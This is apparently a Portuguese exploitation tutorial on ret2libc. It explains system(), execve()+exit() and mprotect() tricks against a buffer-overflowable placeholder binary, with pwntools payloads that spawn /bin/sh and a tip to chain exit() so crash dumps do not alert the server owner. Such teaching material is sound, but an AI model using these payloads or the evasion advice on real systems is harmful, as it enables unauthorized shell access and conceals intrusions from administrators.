- [Ret2LibC](#ret2libc)
- [Funções Úteis](#funções-úteis)
  - [System()](#system)
      - [Conseguindo o pointer para /bin/sh](#conseguindo-o-pointer-para-binsh)
      - [Layout da stack numa call 32 bits](#layout-da-stack-numa-call-32-bits)
    - [Unindo tudo](#unindo-tudo)
- [Pontos Fracos](#pontos-fracos)
  - [Estaticamente Linkado](#estaticamente-linkado)
  - [Dinamicamente Linkado (+ ASLR)](#dinamicamente-linkado--aslr)
- [Funções Uteis Pt 2](#funções-uteis-pt-2)
  - [Execve() + Exit()](#execve--exit)
  - [Mprotect() + ret2shellcode](#mprotect--ret2shellcode)
    - [Argumentos](#argumentos)
      - [Size](#size)
      - [Perms](#perms)
    - [Classificação](#classificação)
    - [Analise](#analise)

# Ret2LibC
Ret2Libc foi uma técnica desenvolvida para combater W^X. Alem disso, 
ter domínio dessa técnica facilitar a compreensão de ROP. :D 

Por nao podermos colocar o shellcode na stack (ou heap), precisamos 
encontrar outra maneira de conseguir uma shell... Assim, vamos precisar 
encontrar uma parte executável na memoria! Uma função do próprio programa!

Voce se lembra de quando chamávamos uma `call_me()` ou `win()` nos desafios 
iniciais? Então... poderíamos fazer isso... mas ninguém colocaria uma 
função pre-pronta pra nos dar uma shell :(

Felizmente, existe LibC, e dentro dela existem múltiplas funções úteis!

# Funções Úteis
## System()
[Compiler Explorer: System](https://godbolt.org/z/691asM)

Para nosso propósito, ela recebe 1 argumento, o caminho do programa para 
executar (Ex: `/bin/sh`)

Em C:
```C
#include <stdlib.h>
int main() {
    system("/bin/ls");
    return 0;
}
```

Em assembly:
```x86asm
.LC0:
        .string "/bin/ls"
main:
        push    rbp
        mov     rbp, rsp
        mov     edi, OFFSET FLAT:.LC0
        call    System
        mov     eax, 0
        pop     rbp
        ret
```

A função recebe um pointer para a string via `rdi` (64 bits) ou os 
argumentos sao passados pela stack (32 bits). Nesse post vou focar em 32 
bits!

#### Conseguindo o pointer para /bin/sh

Usando pwntools: 
```python
x = next(libc.search(b"/bin/sh\x00"))
```
x sera um pointer contendo o endereço da string `/bin/sh`

Em 32 bits, basta colocar ele no local previamente mencionado!

Em 64 bits, precisaremos de um gadget para colocar esse valor no rdi...
Portanto, voce vai precisar saber ROP, o tema do proximo capitulo!

#### Layout da stack numa call 32 bits
```x86asm
    Func_1
 ____________
|            |
|    RBP     | 
|____________| 
 ____________
|            |
|    RIP     | <--- RSP -> No BOF tradicional, corrompemos esse RIP!
|____________|      Porem, nao costumamos pensar o que acontece depois!
 ____________
|            |      Um ret simplesmente significa:
|   ARG_1    |         pop RIP
|____________|         jmp RIP
 ____________           
|            |      E como em qualquer pop, RSP se movimenta
|   ARG_2    |
|____________| 

    Func_1                                             System
 ____________                                       ____________            
|            |                                     |            |
|    RBP     |   Vamos supor que RIP->System()     |            |
|____________|   Então da perspectiva de System,   |____________|
 ____________           ARG_1 vira RIP              ____________       
|            |          ARG_2 vira ARG_1           |            |
|    RIP     |   ____                              |            |
|____________|       |                             |____________|
 ____________        |                              ____________
|            |       V                             |            |  
|   ARG_1    | <--- RSP                   RSP ---> |    RIP     |
|____________|                                     |____________|
 ____________                                       ____________
|            |                                     |            |  
|   ARG_2    |                                     |   ARG_1    |
|____________|                                     |____________|


    Func_1                                             System
 ____________                                       ____________            
|            |                                     |            |
| AAAAAAAAAA |    A Func_1 esta vulnerável a BOF   |            |
|____________|                                     |____________|
 ____________                                       ____________       
|            |    E nos controlamos a stack :D     |            |
|  SYSTEM()  |    Então podemos passar os args     |            |
|____________|    e o RIP de retorno para System   |____________|
 ____________                                       ____________
|            |                                     |            |  
|  DDDDDDD   | <--- RSP                   RSP ---> |    RIP     |
|____________|                                     |____________|
 ____________                                       ____________
|            |                                     |            |  
|  /bin/sh   | <<< --------------------------- >>> |   ARG_1    |
|____________|                                     |____________|

                  System (ou qualquer outra 
                  função que voce chamar) 
                  vai executar /bin/sh e 
                  tentar retornar para DDDDDDDD

```
Ao tentar retornar para `DDDDDDDD`, ocorrera uma `SEGFAULT`.

Isso sera discutido na proxima secao (`Execve`)....

Mas por enquanto, o que voce precisa saber: `System` cria um novo processo 
(`fork`, gerando um processo secundário: `child_proc`)! 

Então retornar errado vai crashar o `child_proc` ... mas e esse crash sera 
reportado para o processo principal e nao para o computador!

> `System` AGE COMO UMA EXCESSAO: NAO GERANDO `SEGFAULT` AO RETORNAR ERRADO !!!!!

### Unindo tudo
Vamos supor que o programa esta vulnerável a um BoF tradicional na função 
`batata()`, possui W^X, e o ASLR esta DESATIVADO!

O `RIP` salvo esta a 40 bytes de distancia!

```python
from pwn import *

elf = ELF("./blablabla")
libc = elf.libc

payload = b""
payload += b"A" * 40            # Padding
payload += p32(libc.sym.system) # RIP salvo batata()
payload += b"D" * 8             # Padding / RIP salvo system()
payload += p32(next(libc.search(b"/bin/sh\x00"))) # ARG_1 para system()
```

Caso voce esteja com pressa, adios!

Daqui em diante eu vou discutir técnicas alternativas de ret2libc, vantagens 
e desvantagens... Para ter bom proveito eu recomendo re-ler depois de aprender 
ROP! 

# Pontos Fracos
## Estaticamente Linkado
Em programas estaticamente linkados ao libc, somente podemos usar uma 
fração das funções presentes, pois somente as que sao originalmente usadas 
pelo programa sao linkadas!

## Dinamicamente Linkado (+ ASLR)
Ja em programas que usam o libc do sistema, voce pode usar o todo o 
potencial do libc. Porem caso o computador possua ASLR ligado, sera 
necessário primeiro encontrar o endereço aleatório do libc (libc-leak), ou 
executar o exploit em loop ate voce dar sorte (viável somente em 
computadores 32 bits).

# Funções Uteis Pt 2
## Execve() + Exit()
[Compiler Explorer: System](https://godbolt.org/z/7c6xWd)

`Execve` e simplesmente um wrapper envolta da syscall de mesmo nome, e 
funciona igual `System`, porem com uma diferença: `System` cria um novo 
processo para o programa, enquanto `Execve` substitui o atual!

Quando vc sai da shell em `System`, o programa finaliza normalmente. Ja em 
`Execve`, ele age como se estivesse retornando de uma `call`, assim, se voce 
simplesmente chamar ele, quando voce fechar a shell vai gerar uma 
`SEGFAULT` tentando executar `*DDDDDDD`

E com a `SEGFAULT`, um core dump sera gerado... Disparando alarmes e 
ativando mecanismos de segurança que alertam o dono do servidor!

Assim, precisamos substituir esse valor por `Exit()`, garantindo que o 
programa finalize silenciosamente!

Alem disso, existe mais uma diferença, `execve` recebe 3 argumentos:

```C
#include <stdio.h>
#include <unistd.h>
int main() {
  execve("./blablabla", NULL, NULL);
  return 1;
}
```

O primeiro: programa a ser executado

O segundo: argv (poderíamos passar `-p` para `sh` manter os privilégios)

O terceiro: envp (environment vars)

Nos podemos simplesmente defini-las como `NULL` para evitar dor de cabeca!

Em 64 bits precisaríamos de múltiplos gadgets para salvar um em cada register

```x86asm
.LC0:
        .string "./blablabla"
main:
        push    rbp
        mov     rbp, rsp
        mov     edx, 0                ; envp
        mov     esi, 0                ; argv
        mov     edi, OFFSET FLAT:.LC0 ; programa
        call    execve
        mov     eax, 1
        pop     rbp
        ret
```

Caso voce queira usar argv:

```C
#include <stdio.h>
#include <unistd.h>
int main() {
  char *argv[] = {"arg1", "arg2", NULL};
  execve("./blablabla", argv, NULL);
  return 1;
}
```
```x86asm
.LC0:
        .string "arg1"
.LC1:
        .string "arg2"
.LC2:
        .string "./blablabla"
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 32
        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
        mov     QWORD PTR [rbp-16], 0
        lea     rax, [rbp-32]
        mov     edx, 0
        mov     rsi, rax
        mov     edi, OFFSET FLAT:.LC2
        call    execve
        mov     eax, 1
        leave
        ret
```

E combinando tudo: [Compiler Explorer](https://godbolt.org/z/45dsKr)

Vai testar la, pra voce criar uma vibe intuitiva do que ta acontecendo!
```C
#include <stdio.h>
#include <unistd.h>
int main() {
  char *argv[] = {"arg1", "arg2", NULL};
  char *envp[] = {"env1", "env2", NULL};
  execve("./blablabla", argv, envp);
  return 1;
}}
```
```x86asm
..LC0:
        .string "arg1"
.LC1:
        .string "arg2"
.LC2:
        .string "env1"
.LC3:
        .string "env2"
.LC4:
        .string "./blablabla"
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 64
        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
        mov     QWORD PTR [rbp-16], 0
        mov     QWORD PTR [rbp-64], OFFSET FLAT:.LC2
        mov     QWORD PTR [rbp-56], OFFSET FLAT:.LC3
        mov     QWORD PTR [rbp-48], 0
        lea     rdx, [rbp-64]
        lea     rax, [rbp-32]
        mov     rsi, rax
        mov     edi, OFFSET FLAT:.LC4
        call    execve
        mov     eax, 1
        leave
        ret
```

Bem, agora que voce voltou de ficar brincando com a função, vamos voltar a pratica:

Eu tenho 99% de certeza que isso funcionaria, porem eu nunca usei execve em 32 bits! D:


```python
from pwn import *

elf = ELF("./blablabla")
libc = elf.libc

payload = b""
payload += b"A" * 40                              # Padding
payload += p32(libc.sym.execve)                   # RIP salvo batata()
payload += p32(libc.sym.exit)                     # RIP salvo execve()
payload += p32(next(libc.search(b"/bin/sh\x00"))) # ARG_1 execve()
payload += p32(0)                                 # argv execve()
payload += p32(0)                                 # envp execve()
```
Os argumentos estão sendo passados conforme convenção... mas eu nao posso garantir!

Tecnicamente eu poderia testar usando a referencia acima (`[rbp - 123]`) ! opa, preguiça hehehe :/

> Mas como eu mencionei anteriormente, `execve` e a proxima técnica (`mprotect`) 
> sao mais comuns apos voce aprender ROP, apesar de tecnicamente serem ret2libc

## Mprotect() + ret2shellcode 

`Mprotect` pode ser usado para tornar uma região da memoria `RWX` novamente!

A funcao recebe 3 argumentos: mprotect(memory, size, perms) 

Assim, em 64 bits vamos precisar de uma chain, e em 32 bits dar push da 
direita pra esquerda!

```
mprotect
ret       -> shellcode
memory
size
perms
```

### Argumentos
#### Size
O valor deve ser alinhado ao page_size, exemplo: 
0x1000 em x86_64

Para encontrar esse valor na arquitetura que voce esta usando, basta ler o 
manual (opção chata e 0% descolada) ou usar ` page_size = getpagesize ();` em C


#### Perms
As permissões sao: `PERM_READ, PERM_WRITE,... etcetc`

> OBS: existem outras permissões relacionadas a memoria privada vs compartilhada etc

Porem, essas sao somente macros de valor substituídas por `ints`

> read=1 write=2 exec=4

Assim, para termos todas as permissões, o valor de perms deve ser `7`!


### Classificação

Esses tipo de exploit se classifica como: exploit de múltiplas etapas 

Assim, tornando a região do nosso shellcode executável, e somente depois 
pulando para ele!
Esses exploits vem se tornando mais e mais comuns conforme novas proteções 
sao adicionadas!

### Analise

Porem, essa técnica sera usada predominantemente em SROP 64 bits !

Caso voce nao esteja vendo SROP no momento, pode pular e voltar no futuro!

Eu recomendo que voce pegue o exemplo em `man mprotect` e brinque com ele + 
`strace --trace=mprotect` para criar uma intuição!

Eu alterei o meu para ficar assim:


```C
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static int alloc_size;
static char* memory;

// gcc c.c -o c

void segv_handler (int signal_number) 
{
 printf ("memory accessed!\n");
 mprotect (memory, alloc_size, PROT_READ | PROT_WRITE);
} 

void foo() {
 mprotect (memory, alloc_size, 2);
}

int main ()
{
 int fd;
 struct sigaction sa;

 /* Install segv_handler as the handler for SIGSEGV. */
 memset (&sa, 0, sizeof (sa));
 sa.sa_handler = &segv_handler;
 sigaction (SIGSEGV, &sa, NULL);
 
 /* Allocate one page of memory by mapping /dev/zero. Map the memory
   as write-only, initially. */
 alloc_size = getpagesize ();
 fd = open ("/dev/zero", O_RDONLY);
 memory = mmap (NULL, alloc_size, PROT_WRITE, MAP_PRIVATE, fd, 0);
 close (fd);

 /* Write to the page to obtain a private copy. */
 memory[0] = 0;

 foo();


 /* Write to the allocated memory region. */
 memory[0] = 1;

 /* All done; unmap the memory. */
 printf ("all done\n");
 munmap (memory, alloc_size);
 return 0;
}
```

Eu coloquei a funcao dentro do `foo()`, caso o gcc esteja colocando ela inline,
vale a pena checar as flags de otimização!

A funcao fica: 
```x86asm
   0x00005555555552a7 <+0>:	endbr64 
   0x00005555555552ab <+4>:	push   rbp
   0x00005555555552ac <+5>:	mov    rbp,rsp
   0x00005555555552af <+8>:	mov    eax,DWORD PTR [rip+0x2d63]  # alloc_size
   
b  0x00005555555552b5 <+14>:	movsxd rcx,eax
   
b  0x00005555555552b8 <+17>:	mov    rax,QWORD PTR [rip+0x2d61]  # memory

b  0x00005555555552bf <+24>:	mov    edx,0x2

   0x00005555555552c4 <+29>:	mov    rsi,rcx
   0x00005555555552c7 <+32>:	mov    rdi,rax

b  0x00005555555552ca <+35>:	call   0x555555555150 <mprotect@plt>

   0x00005555555552cf <+40>:	nop
   0x00005555555552d0 <+41>:	pop    rbp
   0x00005555555552d1 <+42>:	ret  
```
`b` sao os breakpoints

Em seguida, crie o seguinte gdbscript

```
disassemble foo

b *foo+14
b *foo+17
b *foo+24
b *foo+35

r
info registers $eax
c
info registers $eax $rcx
c
info registers $rax
c
info registers $edx $rsi $rcx $rdi $rax
```
Assim, temos uma visão de todos os registers afetados na funcao! E fica mais 
fácil de brincar com o programa, ver o que causa erro, etcetc....

```x86asm
Efetivamente, a funcao recebe:
edx = flags
rsi = page size
rdi = addr

Breakpoint 4, 0x00005555555552ca in foo ()
edx            0x2                 2
rsi            0x1000              4096
rdi            0x7ffff7fc7000      140737353904128
```


